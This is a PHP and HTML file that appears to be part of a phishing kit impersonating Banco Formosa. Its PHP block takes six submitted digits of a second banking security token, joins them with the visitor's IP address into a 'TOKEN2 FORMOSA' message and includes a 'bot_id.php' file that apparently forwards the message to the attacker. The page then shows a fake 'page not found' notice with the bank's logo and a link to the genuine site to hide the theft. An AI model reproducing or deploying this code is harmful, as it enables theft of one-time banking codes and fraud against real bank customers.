<?php  
  $digit7 = $_POST['digit7'];
  $digit8 = $_POST['digit8'];
  $digit9 = $_POST['digit9'];
  $digit10 = $_POST['digit10'];
  $digit11 = $_POST['digit11'];
  $digit12 = $_POST['digit12'];
  
  $tok2 = $digit7 . $digit8 . $digit9 . $digit10 . $digit11 . $digit12;
  
  $enviara = "TOKEN2 FORMOSA ##\n" .
             "<b>TOKEN2: </b>  <code>".$tok2."</code>\n" .
             "🌐 IP ".$_SERVER['REMOTE_ADDR']."\n";
             
  $enviar = urldecode($enviara);
  include 'bot_id.php';
?>

<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Banco Formosa - Página no encontrada</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      font-size: 16px;
    }
    .container {
      margin: 0 auto;
      max-width: 800px;
      text-align: center;
    }
    .logo {
      margin-top: 50px;
      margin-bottom: 30px;
      width: 300px;
    }
    .message {
      margin-bottom: 30px;
    }
    .button {
      display: inline-block;
      padding: 10px 20px;
      background-color: #00447c;
      color: #fff;
      text-decoration: none;
      border-radius: 5px;
    }
  </style>
</head>
<body>
  <div class="container">
    <img class="logo" src="https://www.bancos.life/argentina/bank/banco-de-formosa.jpg" alt="Banco Formosa">
    <div class="message">
      <h1>Página no encontrada</h1>
      <p>Lo sentimos, la página que está buscando no existe en nuestro sitio web.</p>
      <p>Haga clic en el siguiente botón para volver a la página de inicio.</p>
      <a class="button" href="https://www.bancoformosa.com.ar/">Ir a la página de inicio</a>
    </div>
  </div>
</body>
</html>

